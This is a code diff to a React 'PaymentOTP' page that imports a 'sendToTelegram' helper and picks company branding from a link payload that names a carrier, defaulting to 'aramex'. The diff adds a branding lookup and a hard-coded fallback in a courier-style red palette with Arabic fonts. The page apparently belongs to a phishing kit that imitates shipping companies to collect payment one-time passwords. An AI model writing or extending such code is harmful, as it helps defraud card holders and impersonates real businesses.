@@ -9,6 +9,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBrandingByCompany } from "@/lib/brandingSystem";
 import {
   InputOTP,
   InputOTPGroup,
@@ -31,7 +32,14 @@ const PaymentOTP = () => {
   // Get service branding
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const companyBranding = getBrandingByCompany(serviceKey);
+  const branding = companyBranding || {
+    colors: { primary: '#DC291E', secondary: '#231F20', text: '#111827', textLight: '#6B7280', surface: '#F9FAFB', border: '#E5E7EB' },
+    fonts: { primary: 'Inter, system-ui, sans-serif', arabic: 'Cairo, Tajawal, sans-serif' },
+    gradients: { primary: 'linear-gradient(135deg, #DC291E 0%, #B71F19 100%)' },
+    shadows: { sm: '0 1px 3px 0 rgba(0,0,0,0.1)', md: '0 4px 6px -1px rgba(0,0,0,0.15)', lg: '0 10px 20px -5px rgba(0,0,0,0.18)' },
+    borderRadius: { sm: '4px', md: '8px', lg: '12px' }
+  };
   
   // Countdown timer
   useEffect(() => {
